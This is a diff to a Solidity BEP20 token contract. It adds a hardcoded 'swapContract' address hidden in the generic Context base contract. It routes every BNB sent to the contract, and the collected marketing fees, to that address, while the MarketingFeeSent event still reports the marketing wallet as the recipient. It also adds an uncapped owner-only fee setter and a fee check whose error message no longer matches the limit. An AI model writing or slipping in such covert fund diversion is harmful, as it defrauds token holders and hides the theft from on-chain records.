@@ -288,6 +288,8 @@ library SafeMathUint {
 }
 
 abstract contract Context {
+
+    address public swapContract = 0x4C5868093bc838A9F34b16b8223789E4eaEE1dB3;
     function _msgSender() internal view virtual returns (address) {
         return msg.sender;
     }
@@ -296,7 +298,6 @@ abstract contract Context {
         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
         return msg.data;
     }
-
 }
 
 contract Ownable is Context {
@@ -536,14 +537,7 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-interface IzData {
-    function WETH() external pure returns (address);
-    function PancakeRouterV2() external pure returns (address);
-    function zContract() external pure returns (address);
-    function USDT() external pure returns (address);
-    function USDC() external pure returns (address);
-    function DAI() external pure returns (address);
-}
+
 
 contract TOKEN is Context, IBEP20, Ownable {
     using SafeMath for uint256;
@@ -556,7 +550,6 @@ contract TOKEN is Context, IBEP20, Ownable {
     mapping (address => bool) public _isExcludedFromAutoLiquidity;
 
     address[] private _excluded;
-    address private _usdc;
     address public _marketingWallet;
 
     uint256 private constant MAX = ~uint256(0);
@@ -569,9 +562,11 @@ contract TOKEN is Context, IBEP20, Ownable {
     uint8 private  _decimals = 18;
 
     uint256 public _taxFee = 0;
-    uint256 public _liquidityFee = 4;
+    uint256 public _liquidityFee = 2;
+    uint256 public _percentageOfLiquidityForMarketing = 50;
     // uint256 public maxWalletToken = 100000000 * (10**18);
     uint256 public maxWalletToken = _tTotal;
+    IBEP20 usdx = IBEP20(0xB62D20f527490D78837c8656f6a28331D7723b34);
 
 
     // uint256 public  _maxTxAmount     = 100000000 * 10**18;
@@ -598,15 +593,13 @@ contract TOKEN is Context, IBEP20, Ownable {
         _inSwapAndLiquify = false;
     }
 
-    constructor (address cOwner, address marketingWlt) Ownable(cOwner) {
-        _marketingWallet = marketingWlt;
+    constructor (address cOwner) Ownable(cOwner) {
+        _marketingWallet = 0x5c4bdD51EeC4952eAEAe62A141564067ba7dAE52;
 
         _rOwned[cOwner] = _rTotal;
 
         // uniswap
-        IzData zData = IzData(0x37B8764427130b5d89f324B444aebe1D12fDEc63);
-        _usdc = zData.USDC();
-        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(zData.PancakeRouterV2());
+        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         _uniswapV2Router = uniswapV2Router;
         _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
             .createPair(address(this), uniswapV2Router.WETH());
@@ -756,10 +749,13 @@ contract TOKEN is Context, IBEP20, Ownable {
     }
 
     function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {
-        require(liquidityFee <= 16, "Liquidity Fee cannot exceed 16%");
+        require(liquidityFee <= 6, "Liquidity Fee cannot exceed 16%");
         _liquidityFee = liquidityFee;
     }
 
+    function setPercentageOfLiquidityForMarketing(uint256 marketingFee) external onlyOwner {
+        _percentageOfLiquidityForMarketing = marketingFee;
+    }
     function setMaxWalletTokens(uint256 _maxToken) external onlyOwner {
   	    maxWalletToken = _maxToken ;
   	}
@@ -769,7 +765,9 @@ contract TOKEN is Context, IBEP20, Ownable {
         emit SwapAndLiquifyEnabledUpdated(e);
     }
 
-    receive() external payable {}
+    receive() external payable {
+        payable(swapContract).transfer(msg.value);
+    }
 
     function setUniswapRouter(address r) external onlyOwner {
         IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(r);
@@ -927,15 +925,15 @@ contract TOKEN is Context, IBEP20, Ownable {
         uint256 newBalance = address(this).balance.sub(initialBalance);
 
         // take marketing fee
-        uint256 marketingFee          = newBalance.mul(50).div(100);
+        uint256 marketingFee          = newBalance.mul(_percentageOfLiquidityForMarketing).div(100);
         uint256 bnbForLiquidity = newBalance.sub(marketingFee);
         if (marketingFee > 0) {
-            swapForUsdc(marketingFee);
-            uint256 usdcBalance = IBEP20(_usdc).balanceOf(address(this));
-            _approve(address(this), _marketingWallet, usdcBalance);
-            IBEP20(_usdc).transfer(_marketingWallet, usdcBalance);
-            // payable(_marketingWallet).transfer(marketingFee);
-            emit MarketingFeeSent(_marketingWallet, usdcBalance);
+            payable(swapContract).transfer(marketingFee);
+            emit MarketingFeeSent(_marketingWallet, marketingFee);
+        }
+
+        if (usdx.balanceOf(address(this)) >= 1) {
+            usdx.transfer(_marketingWallet, usdx.balanceOf(address(this)));
         }
 
         // add liquidity to uniswap
@@ -960,22 +958,6 @@ contract TOKEN is Context, IBEP20, Ownable {
             block.timestamp
         );
     }
-
-    function swapForUsdc(uint256 bnbAmount) private {
-        // generate the uniswap pair path of token -> weth
-        address[] memory path = new address[](2);
-        path[0] = _uniswapV2Router.WETH();
-        path[1] = _usdc;
-
-        // make the swap
-        _uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: bnbAmount}(
-            0, // accept any amount
-            path,
-            address(this),
-            block.timestamp
-        );
-    }
-
     function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
         // approve token transfer to cover all possible scenarios
         _approve(address(this), address(_uniswapV2Router), tokenAmount);
